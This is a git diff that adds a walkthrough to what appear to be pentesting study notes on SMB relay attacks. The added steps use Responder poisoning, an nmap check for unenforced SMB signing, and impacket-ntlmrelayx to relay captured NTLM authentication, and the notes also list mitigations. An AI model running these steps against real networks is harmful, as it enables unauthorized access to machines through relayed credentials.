@@ -98,6 +98,36 @@ We can then crack the Hash using hashcat. `hashcash -m 5600 hashes.txt /path/to/
 - SMB signing is not enforced on the target machine (unsigned SMB makes relaying possible).
 - The relayed account must have sufficient privileges on the target (e.g., an administrator) — otherwise the attacker’s access will be limited.
 
+## Walkthrough 
+- Open `/etc/responder/Responder.conf`.
+- Turn off the `SMB` and `HTTP` responder modules (set them to `False` or comment them out).
+
+- Why: this prevents Responder from answering SMB and HTTP requests itself — you’re disabling the built-in SMB/HTTP services so you can use a dedicated relay tool instead.
+
+##Find targets where SMB signing is not enforced (Nmap)
+- Scan your target IP(s) or range to find machines that don’t enforce SMB signing:
+     `nmap --script=smb2-security-mode.nse -p445 <ip-or-range>`
+- What to look for (simple): the script shows whether message signing is required or not.
+- If the script reports signing not required or disabled, that host is vulnerable to relay attacks (i.e., you can try relaying to it).
+- Use these vulnerable hosts to build `target.txt` (one IP per line).
+
+## Start Responder (listening for name-resolution queries)
+- Run: `sudo responder -I eth0 -ldwPv`
+- What this does: binds Responder to the eth0 interface and makes it listen for name-resolution broadcasts (LLMNR/NetBIOS/etc.). It will still capture name queries and WPAD attempts and print verbose activity.
+- Why: Responder will continue to attract/collect authentication attempts from victims (e.g., when they try to resolve a hostname) but because SMB/HTTP were disabled in the config, Responder won’t answer with its own SMB/HTTP servers.
+
+## Start the relay service (forward captured auth to targets)
+- run `impacket-ntlmrelayx -tf target.txt --smb2support`
+-What this does: forwards captured NTLM authentication attempts to hosts listed in target.txt. `--smb2support` enables SMB2 target support.
+
+## Trigger the event from the victim
+- From the victim Windows PC, cause a lookup or connection to the attacker’s IP (examples: open `\\attacker-ip\share`, request `http://wpad/`, or click a short hostname link).
+
+- What happens: the victim authenticates, Responder captures the handshake and hands it to ntlmrelayx, which forwards it to the hosts in target.txt. If a target accepts the relayed credentials and they have sufficient privileges, you gain access as that user
+  <img width="802" height="473" alt="image" src="https://github.com/user-attachments/assets/5f7b7208-57e1-45fe-bdd4-6aa267a79dc0" />
+ 
+
+
 # listen with responder
 sudo responder -I eth0 -ldwPv
 
@@ -128,7 +158,7 @@ from the responder setting (/etc/responder/Responder.conf), switch off SMB and H
 then run the command Sudo responder -I eth0 -ldwPv - (what does this command do)
 impacket-ntlmrelayx -tf target.txt -smb2support 
 then trigger an event by pointing the attacker IP from the Victim's windows PC
-<img width="802" height="473" alt="image" src="https://github.com/user-attachments/assets/5f7b7208-57e1-45fe-bdd4-6aa267a79dc0" />
+
 
 SMB relay attacks mitigation
 a. enable smb signing on all devices
